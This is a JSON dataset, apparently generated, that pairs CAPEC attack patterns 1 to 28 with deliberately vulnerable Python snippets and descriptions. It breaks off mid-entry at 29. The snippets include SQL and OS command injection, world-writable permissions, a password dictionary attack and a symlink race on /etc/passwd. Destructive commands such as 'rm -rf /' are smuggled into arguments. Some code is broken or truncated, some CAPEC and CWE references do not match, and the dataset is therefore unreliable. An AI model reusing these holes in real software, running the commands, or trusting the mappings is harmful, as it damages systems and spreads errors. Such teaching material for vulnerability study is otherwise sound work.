[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "import os\n\n# CWE-276: Incorrect Default Permissions\nfile_path = '/path/to/sensitive/file'\nif os.access(file_path, os.W_OK):\n    print('File is writable by anyone!')\n\n# CWE-285: Improper Authorization\nadmin_only_functionality = ['manage_users', 'access_sensitive_data']\ndef check_permissions(username):\n    if username != 'admin':\n        return False\n    return True\n\nusername = 'attacker'\nif check_permissions(username):\n    print('Access granted to', username)\n    for func in admin_only_functionality:\n        print('Executing', func)\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\ncritical_resource = '/path/to/critical/resource'\nos.chmod(critical_resource, 0o777)\nprint('Permissions set to 777 for', critical_resource)\n\n# CWE-1220: Insufficient Granularity of Access Control\naccess_control_policy = {'read': ['admin', 'user'], 'write': ['admin']}\ndef check_access(username, action):\n    if action in access_control_policy and username in access_control_policy[action]:\n        return True\n    return False\n\nusername = 'user'\naction = 'write'\nif check_access(username, action):\n    print('Access granted to', username, 'for', action)\n",
        "description": "This code snippet demonstrates the CAPEC of missing access control lists (ACLs) in an application. It includes several CWEs that contribute to this vulnerability, such as incorrect default permissions, improper authorization, unrestricted file upload, and insufficient granularity of access control. The code shows how an attacker can exploit these weaknesses to access sensitive information and functionality."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import time\n\ndef login_attempt(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\nattempts = {}\n\nwhile True:\n    username = input('Enter username: ')\n    password = input('Enter password: ')\n    if username not in attempts:\n        attempts[username] = 0\n    attempts[username] += 1\n    if attempts[username] > 3:\n        print('Account locked out due to excessive login attempts. Try again later.')\n        time.sleep(300)  # 5 minute lockout\n    elif login_attempt(username, password):\n        print('Login successful!')\n        break\n    else:\n        print('Invalid username or password. Try again.')",
        "description": "This code snippet demonstrates a vulnerable login system that can be exploited by an attacker to launch a denial of service attack against a legitimate user. The system has a weak password requirement (CWE-521) and an overly restrictive account lockout mechanism (CWE-645) that can be triggered too easily. An attacker can exploit this by making excessive login attempts (CWE-307) to lock out a legitimate user's account. The system also has a weak authentication mechanism (CWE-1390) that can be bypassed. The code does not implement sufficient measures to prevent brute force attacks, making it susceptible to authentication bypass (CWE-305)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import urllib.parse\n\ndef vulnerable_api(input_data):\n    # CWE-173: Improper Handling of Alternate Encoding\n    # CWE-172: Encoding Error\n    input_data = urllib.parse.unquote(input_data)\n    \n    # CWE-20: Improper Input Validation\n    if input_data.startswith('..'):  # Insecure path validation\n        return 'Invalid input'\n    \n    # CWE-41: Improper Resolution of Path Equivalence\n    # CWE-707: Improper Neutralization\n    file_path = '/uploads/' + input_data\n    \n    # CWE-179: Incorrect Behavior Order: Early Validation\n    # CWE-180: Incorrect Behavior Order: Validate Before Canonicalize\n    # CWE-181: Incorrect Behavior Order: Validate Before Filter\n    if validate_input(input_data):  # Insecure validation\n        process_input(file_path)\n    \n    # CWE-183: Permissive List of Allowed Inputs\n    # CWE-184: Incomplete List of Disallowed Inputs\n    # CWE-697: Incorrect Comparison\n    # CWE-707: Improper Neutralization\n    return 'Input processed successfully'\n\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\ndef process_input(file_path):\n    # Insecure command construction\n    command = 'cat ' + file_path\n    os.system(command)\n",
        "description": "This Python code snippet demonstrates the CAPEC where an adversary can introduce leading 'ghost' characters to bypass input filters. The code is vulnerable to multiple CWEs, including improper input validation, encoding errors, path equivalence issues, and incorrect behavior order. The vulnerable_api function takes user input, performs insecure validation and canonicalization, and then processes the input using an insecure command construction."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import socket\n\ndef authenticate(ip):\n    if ip == '127.0.0.1':\n        return True\n    else:\n        return False\n\nip = '0177.0000.0000.0001'\nif authenticate(ip):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This code snippet demonstrates the CAPEC of using unexpected formats for representing IP addresses to bypass application access control. The authenticate function checks if the provided IP address is '127.0.0.1', but it does not properly handle alternate encodings. The IP address '0177.0000.0000.0001' is a valid alternate encoding for '127.0.0.1', but the function does not account for this. This is an example of CWE-291: Reliance on IP Address for Authentication, CWE-173: Improper Handling of Alternate Encoding, and CWE-923: Improper Restriction of Communication Channel to Intended Endpoints."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import socket\n\ndef send_supervisor_signal(host, port, tone):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((host, port))\n    sock.send(tone.encode())\n    response = sock.recv(1024)\n    if b'authenticated' in response:\n        # bypass authentication\n        return True\n    return False\n\ndef main():\n    host = '10.0.0.1'\n    port = 1234\n    tone = '2600Hz'  # supervisor signal tone\n    if send_supervisor_signal(host, port, tone):\n        print('Blue boxing successful!')\n        # perform administrative functions\n    else:\n        print('Failed to blue box')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a blue boxing attack, where an adversary sends a tone to impersonate a supervisor signal to gain unauthorized access to administrative functions. The code establishes a socket connection to a target host and port, sends the tone, and checks if the response indicates successful authentication. If authenticated, the code performs administrative functions. This code embodies CWEs 285, 923, 940, 294, and 924, as it lacks proper authorization, restriction of communication channels, verification of source, and enforcement of message integrity."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import subprocess\n\ndef execute_command(ip_address):\n    command = \"ping -c 1 \" + ip_address\n    subprocess.call(command, shell=True)\n\n# Example usage:\nexecute_command(\"8.8.8.8; rm -rf /\")",
        "description": "This code snippet demonstrates the CAPEC of injecting data or command syntax through the target's use of non-validated and non-filtered arguments of exposed services or methods. The CWEs embodied in this code include CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), CWE-146 (Improper Neutralization of Expression/Command Delimiters), and CWE-78 (Improper Neutralization of Special Elements used in an OS Command). The code defines a function execute_command that takes an IP address as input and uses it to construct a ping command. However, the input is not validated or filtered, allowing an attacker to inject malicious commands, such as the rm -rf / command in the example usage, which could lead to arbitrary code execution."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import sqlite3\n\ndef get_user(username):\n    conn = sqlite3.connect('users.db')\n    c = conn.cursor()\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n    c.execute(query)\n    result = c.fetchone()\n    if result:\n        return True\n    else:\n        return False\n\nusername = input(\"Enter username: \")\nprint(get_user(username))",
        "description": "This Python code snippet demonstrates Blind SQL Injection (CAPEC-66) by constructing a SQL query using user input without proper validation or sanitization, making it vulnerable to SQL Injection attacks. The code uses the `input()` function to get a username from the user, and then constructs a SQL query using string concatenation. This allows an attacker to inject malicious SQL code as part of the username, potentially allowing them to extract sensitive data or modify the database. The code also lacks proper error handling, making it vulnerable to CWE-209: Generation of Error Message Containing Sensitive Information. Additionally, the code does not properly validate user input, making it vulnerable to CWE-20: Improper Input Validation, CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component, CWE-89: Improper Neutralization of Special Elements used in an SQL Command, CWE-697: Incorrect Comparison, and CWE-707: Improper Neutralization."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import ctypes\n\ndef vulnerable_function(buffer):\n    # CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n    output_buffer = ctypes.create_string_buffer(10)\n    ctypes.memmove(output_buffer, buffer, len(buffer))\n    return output_buffer.raw\n\n# CWE-20: Improper Input Validation\nbuffer = b'a' * 20\n\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\nvulnerable_function(buffer)\n",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability. The vulnerable_function copies an input buffer to an output buffer without checking the size of the input buffer, leading to a buffer overflow. The input buffer is not validated, and its size is not restricted, making it possible to overflow the output buffer. This code is vulnerable to CWE-120, CWE-20, and CWE-119."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    buffer = bytearray(10)\n    os.system(user_input + ' > output.txt')\n    buffer.extend(user_input.encode())\n    return buffer\n\nuser_input = 'rm -rf /*'\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable command-line utility that can be exploited to escalate privilege to root. The `vulnerable_function` takes user input and passes it to the `os.system` function without proper validation, allowing an attacker to inject malicious commands (CWE-74). The function also performs a buffer copy without checking the size of the input (CWE-120), leading to a buffer overflow. Additionally, the code does not restrict operations within the boundaries of the buffer (CWE-119) and does not validate the input properly (CWE-20)."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef vulnerable_function(env_var):\n    buffer_size = 10\n    buffer = [0] * buffer_size\n    env_value = os.environ.get(env_var)\n    if env_value:\n        for i in range(len(env_value)):\n            buffer[i] = ord(env_value[i])\n    return buffer\n\nenv_var = 'SOME_ENV_VAR'\nprint(vulnerable_function(env_var))",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability through manipulation of environment variables. The function vulnerable_function() copies an environment variable to a fixed-size buffer without checking the size of the input, leading to a classic buffer overflow (CWE-120). The code also assumes that the environment variable is immutable, which can be controlled or modified by an attacker (CWE-302). Additionally, the code does not restrict operations within the boundaries of the buffer, leading to a range error (CWE-118) and improper restriction of operations within the bounds of a memory buffer (CWE-119)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "from http.server import SimpleHTTPRequestHandler\nimport os\n\nclass CustomHandler(SimpleHTTPRequestHandler):\n    def do_GET(self):\n        filename = self.path.split('/')[-1]\n        if filename.endswith('.php'):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            with open(filename, 'r') as f:\n                self.wfile.write(f.read().encode())\n        else:\n            self.send_response(403)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(b'Access Denied')\n\nif __name__ == '__main__':\n    httpd = http.server.HTTPServer(('localhost', 8000), CustomHandler)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable web server that relies on file extensions to determine how to handle incoming requests. The CustomHandler class is used to handle GET requests, and it checks the file extension to decide whether to serve the file or deny access. However, this approach is vulnerable to attacks that exploit file extension misclassification, as described in the CAPEC. An attacker could potentially upload a malicious file with a misleading extension, causing the server to misclassify it and execute unintended actions."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import socket\n\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-306: Missing Authentication for Critical Function\n\ndef send_message(username, message):\n    # No authentication check for critical function\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n    message_with_username = f\"{{'username': '{username}', 'message': '{message}'}}\"\n    sock.sendto(message_with_username.encode(), ('<broadcast>', 12345))\n\n# CWE-1292: Incorrect Conversion of Security Identifiers\n# CWE-1290: Incorrect Decoding of Security Identifiers\n\ndef decode_security_identifier(encoded_id):\n    # Incorrect decoding mechanism\n    return encoded_id.decode().split(':')[1]\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\ndef receive_message(sock):\n    message, addr = sock.recvfrom(1024)\n    # No message integrity check\n    return message.decode()\n\nif __name__ == '__main__':\n    send_message('admin', 'Hello, world!')\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.bind(('', 12345))\n    message = receive_message(sock)\n    username = decode_security_identifier(message)\n    print(f'Received message from {username}')",
        "description": "This code snippet demonstrates a vulnerable Python script that sends and receives messages over a UDP broadcast channel. It lacks authentication checks, allowing an adversary to impersonate a privileged user. The script also incorrectly decodes security identifiers and does not ensure message integrity during transmission, making it vulnerable to tampering and unauthorized access."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\n\n# CWE-353: Missing Support for Integrity Check\n# CWE-285: Improper Authorization\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n# CWE-15: External Control of System or Configuration Setting\n# CWE-73: External Control of File Name or Path\n# CWE-20: Improper Input Validation\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Environment variable modification\nos.environ['PATH'] = '/tmp/malicious_path'\n\n# Authentication bypass\nauth_token = 'malicious_token'\n\n# Improper input validation\nuser_input = 'malicious_input'\n\n# External control of file name or path\nfile_path = '/tmp/' + user_input + '.txt'\n\n# Exposure of sensitive information\nprint(os.environ)\nprint(auth_token)\n",
        "description": "This Python code snippet demonstrates the CAPEC of modifying environment variables to deviate from expected operation. It includes multiple CWEs, such as missing support for integrity checks, improper authorization, authentication bypass, injection, external control of system settings, file name or path, improper input validation, and exposure of sensitive information. The code modifies the PATH environment variable, bypasses authentication, and exposes sensitive information, showcasing the potential risks of environment variable modification."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import socket\nimport struct\n\nHOST = '0.0.0.0'\nPORT = 8080\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.bind((HOST, PORT))\ns.listen(1)\n\nconn, addr = s.accept()\nprint('Connected by', addr)\n\nwhile True:\n    data = conn.recv(1024)\n    if not data:\n        break\n    # CWE-120: No check for buffer size\n    buffer = bytearray(10)\n    struct.pack_into('10s', buffer, 0, data)\n    # CWE-353: No integrity check\n    conn.sendall(buffer)\n    # CWE-118: No bounds checking\n    index = int(data.decode())\n    if index < 0 or index >= len(buffer):\n        print('Index out of bounds')\n    else:\n        print('Buffer value at index {}: {}'.format(index, buffer[index]))\n    # CWE-119: Out-of-bounds write\n    buffer[index] = 0x41\n    # CWE-74: No input validation\n    user_input = data.decode()\n    if user_input == 'exit':\n        break\n    # CWE-20: No input validation\n    if len(user_input) > 10:\n        print('Input too long')\n    else:\n        print('Received:', user_input)\n    # CWE-680: Integer overflow\n    size = int(user_input) * 10\n    buffer = bytearray(size)\n    # CWE-697: Incorrect comparison\n    if size > 100:\n        print('Buffer too large')\n    else:\n        print('Buffer size:', size)\n\nconn.close()\ns.close()",
        "description": "This Python code snippet demonstrates a vulnerable service that can be exploited by a hostile client. The service listens for incoming connections and receives data from the client. It then performs various operations on the received data without proper validation or bounds checking, leading to potential buffer overflows and other security vulnerabilities."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    command = 'cat ' + user_input + '\n    os.system(command)\n\nuser_input = input('Enter a file name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet is vulnerable to command injection. The 'execute_command' function takes user input and concatenates it with the 'cat' command. The 'os.system' function is then used to execute the command. An attacker can inject malicious commands by providing input that includes special elements such as semicolons, pipes, or backticks, allowing them to execute arbitrary system commands."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import itertools\nimport time\n\n# CWE-521: Weak Password Requirements\npasswords = ['password123', 'iloveyou', 'dragonball']\n\n# CWE-262: Not Using Password Aging\n# CWE-263: Password Aging with Long Expiration\npassword_expiration = 365  # 1 year\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\nmax_attempts = 100\n\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\n\ndef authenticate(username, password):\n    if username == 'admin' and password in passwords:\n        return True\n    return False\n\n# Dictionary Attack\nwith open('dictionary.txt', 'r') as f:\n    dictionary = f.readlines()\n\nfor word in dictionary:\n    word = word.strip()\n    for attempt in range(max_attempts):\n        if authenticate('admin', word):\n            print(f'Access granted with password: {word}')\n            break\n        time.sleep(1)  # CWE-307: wait for 1 second to avoid account lockout\n",
        "description": "This Python code snippet demonstrates a dictionary attack, where an attacker tries each word in a dictionary as passwords to gain access to the system via the 'admin' account. The code embodies CWE-521 by using weak passwords, CWE-262 and CWE-263 by not implementing password aging, CWE-654 by relying on a single factor for authentication, CWE-307 by not restricting excessive authentication attempts, and CWE-308 and CWE-309 by using single-factor password-based authentication."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# CWE-285: Improper Authorization\n# CWE-272: Least Privilege Violation\n\n# Define a critical resource (e.g., a file)\ncritical_file = '/path/to/critical/file'\n\n# Assign incorrect permissions to the critical resource\nos.chmod(critical_file, 0o777)  # Everyone has read, write, and execute permissions\n\n# CWE-59: Improper Link Resolution Before File Access ('Link Following')\n# CWE-282: Improper Ownership Management\n\n# Create a symbolic link to the critical resource\nos.symlink(critical_file, 'link_to_critical_file')\n\n# Change ownership of the symbolic link to an unintended user\nos.chown('link_to_critical_file', 'unintended_user', 'unintended_group')\n\n# CWE-270: Privilege Context Switching Error\n# CWE-693: Protection Mechanism Failure\n\n# Switch to a privileged context without dropping elevated privileges\nos.setuid(0)  # Switch to root user\n\n# Perform an operation that should be restricted to the privileged context\nos.system('cp link_to_critical_file /new/location')\n",
        "description": "This Python code snippet demonstrates a vulnerable configuration that allows an adversary to access and execute a critical resource. It assigns incorrect permissions, creates a symbolic link, and changes ownership to an unintended user. Additionally, it switches to a privileged context without dropping elevated privileges, allowing an attacker to perform restricted operations."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/image', methods=['GET'])\ndef image():\n    img_url = request.args.get('url')\n    return '<img src=\"' + img_url + '\" />'\n\n@app.route('/comment', methods=['GET'])\ndef comment():\n    comment_text = request.args.get('text')\n    return '<!-- ' + comment_text + ' -->'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to the CAPEC attack. The 'image' function takes a URL as input and embeds it in an <img> tag without proper validation, allowing an attacker to inject malicious scripts (CWE-82). The 'comment' function takes user input and embeds it in an HTML comment without proper validation, allowing an attacker to inject malicious scripts (CWE-80, CWE-79). An attacker can exploit these vulnerabilities to launch a Cross-Site Scripting (XSS) attack."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import os\n\ndef execute_script(script):\n    return os.system(script)\n\ndef generate_webpage(user_input):\n    webpage = '<html><body>' + user_input + '</body></html>'\n    return webpage\n\ndef include_widget_from_untrusted_source(url):\n    return '<script src=\\\\",
        "description": "This Python code snippet demonstrates the CAPEC of executing scripts from untrusted sources, leveraging CWEs 284, 79, 830, 1265, and 506. It includes unrestricted access to execute scripts, improper neutralization of user input, inclusion of web functionality from an untrusted source, unintended reentrant invocation of non-reentrant code, and embedded malicious code."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import hashlib\nimport base64\nfrom Crypto.Cipher import AES\n\ndef encrypt(plaintext, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    padded_plaintext = plaintext + ' ' * (16 - len(plaintext) % 16)\n    encrypted_text = cipher.encrypt(padded_plaintext.encode())\n    return base64.b64encode(encrypted_text).decode()\n\ndef brute_force_decrypt(ciphertext, possible_keys):\n    for key in possible_keys:\n        try:\n            cipher = AES.new(key, AES.MODE_ECB)\n            decrypted_text = cipher.decrypt(base64.b64decode(ciphertext))\n            return decrypted_text.decode().strip()\n        except ValueError:\n            pass\n    return None\n\n# Hard-coded cryptographic key (CWE-321)\nkey = b'1234567890123456'\n\n# Inadequate encryption strength (CWE-326)\npossible_keys = [bytes.fromhex(format(i, '032x')) for i in range(2**16)]\n\nplaintext = 'This is a secret message'\nciphertext = encrypt(plaintext, key)\n\nprint('Ciphertext:', ciphertext)\n\n# Brute force decryption (CAPEC-11)\nfor i in range(2**16):\n    possible_key = bytes.fromhex(format(i, '032x'))\n    decrypted_text = brute_force_decrypt(ciphertext, [possible_key])\n    if decrypted_text:\n        print('Decrypted text:', decrypted_text)\n        break",
        "description": "This code snippet demonstrates the CAPEC-11 attack, where an attacker performs a brute-force search on the key space to determine the key that decrypts the ciphertext. The code uses a hard-coded cryptographic key (CWE-321), inadequate encryption strength (CWE-326), and a broken cryptographic algorithm (CWE-327). The IV is not used, which is a protection mechanism failure (CWE-693). The code also generates weak initialization vectors (CWE-1204) by using a predictable sequence of keys."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "import os\nimport uuid\nimport time\n\nclass SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id):\n        session_id = str(uuid.uuid4())[:8]  # CWE-6: Insufficient Session-ID Length\n        self.sessions[session_id] = user_id\n        return session_id\n\n    def validate_session(self, session_id):\n        if session_id in self.sessions:\n            return True\n        return False\n\n    def get_user_id(self, session_id):\n        return self.sessions.get(session_id)\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n# CWE-346: Origin Validation Error\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\n# CWE-384: Session Fixation\n# CWE-664: Improper Control of a Resource Through its Lifetime\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-642: External Control of Critical State Data\n\nsession_manager = SessionManager()\n\n# Create a new session\nuser_id = 123\nsession_id = session_manager.create_session(user_id)\n\n# Store the session ID in a cookie\ncookie = {'session_id': session_id, 'expires': int(time.time()) + 3600}\nprint('Set-Cookie: session_id={}; expires={}'.format(cookie['session_id'], cookie['expires']))\n\n# Later, validate the session\nreceived_session_id = '12345678'  # CWE-290: Spoofed session ID\nif session_manager.validate_session(received_session_id):\n    user_id = session_manager.get_user_id(received_session_id)\n    print('Authenticated as user {}'.format(user_id))\nelse:\n    print('Invalid session ID')",
        "description": "This code snippet demonstrates a vulnerable session management system that is susceptible to authentication bypass attacks. The session ID is generated using a truncated UUID, which can be easily guessed or spoofed (CWE-6, CWE-290). The session ID is stored in a cookie with a long expiration time, allowing an attacker to reuse the session ID (CWE-539). The validation mechanism does not properly verify the origin of the session ID, making it vulnerable to spoofing attacks (CWE-346). The code also lacks proper control over the session resource throughout its lifetime, making it vulnerable to session fixation attacks (CWE-384, CWE-664). Additionally, the code relies on client-side enforcement of server-side security, which can be easily bypassed (CWE-602). The sensitive user ID is stored in a location accessible to unauthorized actors (CWE-642)."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import socket\n\nclass Server:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server.bind((self.host, self.port))\n        self.server.listen(5)\n\n    def handle_client(self, client):\n        while True:\n            request = client.recv(1024)\n            if not request:\n                break\n            # No authentication or input validation\n            if b'admin' in request:\n                client.send(b'Welcome, admin!')\n            else:\n                client.send(b'Unauthorized')\n\n    def run(self):\n        while True:\n            client, address = self.server.accept()\n            self.handle_client(client)\n\nif __name__ == '__main__':\n    server = Server('localhost', 8080)\n    server.run()",
        "description": "This Python code snippet demonstrates a vulnerable server implementation that is susceptible to authentication bypass and spoofing attacks. The server does not perform any authentication or input validation, allowing an attacker to impersonate an admin user by simply sending a request containing the string 'admin'. This code embodies the main idea of the CAPEC, leveraging CWEs 290, 287, 20, 200, and 693."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-20: No input validation\n    if os.path.isfile(file_path):\n        # CWE-434: Unrestricted file upload\n        if file_path.endswith(('.pdf', '.exe', '.dll')):\n            # CWE-646: Relying on file name or extension\n            if file_path.endswith('.exe') or file_path.endswith('.dll'):\n                # CWE-506: Embedded malicious code\n                os.system('start ' + file_path)\n            else:\n                # CWE-433: Unparsed raw web content delivery\n                with open(file_path, 'r') as f:\n                    print(f.read())\n        else:\n            print('File type not supported')\n    else:\n        print('File not found')\n\n# Example usage\nprocess_file('malicious_file.exe')",
        "description": "This Python code snippet demonstrates a vulnerable file processing function that embodies the main idea of the CAPEC. It lacks input validation, allowing unrestricted file uploads, and relies on file names or extensions to determine the appropriate behavior. The code also executes files with malicious code and delivers unparsed raw web content. An attacker can exploit these vulnerabilities by uploading a malicious file, such as an executable, to be processed by the function."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "def process_input(input_string):\n    buffer = bytearray(1024)\n    for i in range(len(input_string)):\n        buffer[i] = ord(input_string[i])\n    return buffer\n\ninput_string = 'A' * 2048\nprocess_input(input_string)",
        "description": "This Python code snippet demonstrates a vulnerable function that processes user input without proper validation, leading to a buffer overflow. The function 'process_input' copies the input string to a fixed-size buffer without checking the size of the input, causing a buffer overflow when the input string is too large. This is an example of CWE-120 (Buffer Copy without Checking Size of Input) and CWE-20 (Improper Input Validation), which can be exploited by an attacker to cause a denial of service or execute arbitrary code."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\nclass DeadlockExample:\n    def __init__(self):\n        self.lock1 = threading.Lock()\n        self.lock2 = threading.Lock()\n\n    def thread1_func(self):\n        with self.lock1:\n            print('Thread 1 acquired lock1')\n            # Simulating some work\n            print('Thread 1 is working...')\n            with self.lock2:\n                print('Thread 1 acquired lock2')\n                print('Thread 1 is working...')\n\n    def thread2_func(self):\n        with self.lock2:\n            print('Thread 2 acquired lock2')\n            # Simulating some work\n            print('Thread 2 is working...')\n            with self.lock1:\n                print('Thread 2 acquired lock1')\n                print('Thread 2 is working...')\n\n    def run(self):\n        t1 = threading.Thread(target=self.thread1_func)\n        t2 = threading.Thread(target=self.thread2_func)\n        t1.start()\n        t2.start()\n\nif __name__ == '__main__':\n    deadlock_example = DeadlockExample()\n    deadlock_example.run()",
        "description": "This Python code snippet demonstrates a deadlock condition, where two threads are competing for locks and waiting for each other to release them, resulting in a deadlock. The code uses two locks, lock1 and lock2, and two threads, t1 and t2. Each thread tries to acquire both locks, but in a different order, causing a deadlock. This code embodies the CAPEC of triggering and exploiting a deadlock condition to cause a denial of service, and relates to CWEs 412, 567, 662, 667, 833, and 1322."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import os\nimport threading\n\n# CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n# CWE-363: Race Condition Enabling Link Following\n\ndef read_file(filename):\n    if os.path.isfile(filename):\n        with open(filename, 'r') as f:\n            content = f.read()\n            return content\n    else:\n        return None\n\n# CWE-368: Context Switching Race Condition\n# CWE-366: Race Condition within a Thread\n\ndef write_file(filename, content):\n    with open(filename, 'w') as f:\n        f.write(content)\n\n# CWE-662: Improper Synchronization\n# CWE-667: Improper Locking\n\ndef thread_func(filename):\n    content = read_file(filename)\n    if content:\n        write_file(filename, 'malicious_content')\n\n# CWE-689: Permission Race Condition During Resource Copy\nfilename = 'example.txt'\nthreads = [threading.Thread(target=thread_func, args=(filename,)) for _ in range(5)]\nfor t in threads:\n    t.start()",
        "description": "This Python code snippet demonstrates a race condition vulnerability. Multiple threads concurrently access and modify a file, which can lead to unexpected behavior and security issues. The code uses improper synchronization, allowing an attacker to exploit the race condition and replace the original file with a malicious one."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import os\nimport time\n\ndef create_temp_file():\n    temp_file = \"/tmp/temp_file\"\n    if not os.path.exists(temp_file):\n        os.symlink(\"/etc/passwd\", temp_file)\n        time.sleep(0.1)  # race condition window\n        with open(temp_file, \"w\") as f:\n            f.write(\"malicious_content\")\n\ncreate_temp_file()",
        "description": "Python code snippet demonstrating a Symlink race condition attack. The code creates a symbolic link to a sensitive file (/etc/passwd) and then writes malicious content to it, exploiting the race condition between the check for file existence and the creation of the temporary file."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import random\nimport string\n\n\ndef fuzz_input(input_length):\n    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(input_length))\n\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-184: Incomplete List of Disallowed Inputs\n    # CWE-506: Embedded Malicious Code\n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    try:\n        # Assume user_input is used to construct a SQL query\n        query = \"SELECT * FROM users WHERE username='\" + user_input + \"'\"\n        # Execute the query\n        # ... \n    except Exception as e:\n        # CWE-209: Generation of Error Message Containing Sensitive Information\n        print(\"Error: \" + str(e))\n\n\ndef main():\n    for _ in range(1000):\n        input_length = random.randint(1, 100)\n        user_input = fuzz_input(input_length)\n        vulnerable_function(user_input)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC attack pattern of fuzzing to identify weaknesses in a system. The code generates random input strings of varying lengths and passes them to a vulnerable function that constructs a SQL query without proper input validation or sanitization. The function is prone to SQL injection attacks, and the error handling mechanism discloses sensitive information. The code embodies CWE-20, CWE-74, CWE-184, CWE-506, and CWE-209."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
